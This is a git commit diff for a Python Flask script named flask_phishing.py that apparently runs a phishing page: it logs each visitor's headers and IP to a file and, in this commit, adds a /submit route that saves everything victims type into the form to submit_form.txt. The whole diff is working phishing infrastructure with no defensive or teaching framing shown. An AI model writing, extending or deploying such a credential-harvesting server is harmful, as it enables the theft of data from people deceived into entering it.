f176244b912de46be727760c975ce29567d589f5
root <root@localhost.localdomain>
2024-07-22 10:39:31 -0300

    0.4

--- flask_phishing.py
+++ flask_phishing.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from flask import Flask, request, render_template, jsonify
+from flask import Flask, request, render_template, jsonify, redirect, url_for
 from termcolor import colored
 
 app = Flask(__name__)
@@ -14,12 +14,26 @@ def index():
             'headers':dict(request.headers),
     }
 
-    print(colored(f"Get request info: {user_info}"))
+    print(colored(f"Get request info: {user_info}", "red"))
 
     with open('click_log.txt', 'a') as f:
         f.write(f"{user_info}")
 
     return render_template("form.html", user_info=user_info)
+
+@app.route('/submit', methods=['POST'])
+def submit():
+    form_data = request.form.to_dict()
+    user_info = {
+            'form_data': form_data
+    }
+
+    print(colored(f"Submit request info: {user_info}", "red"))
+
+    with open('submit_form.txt', 'a') as f:
+        f.write(f"{user_info}")
+
+    return redirect(url_for('index'))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
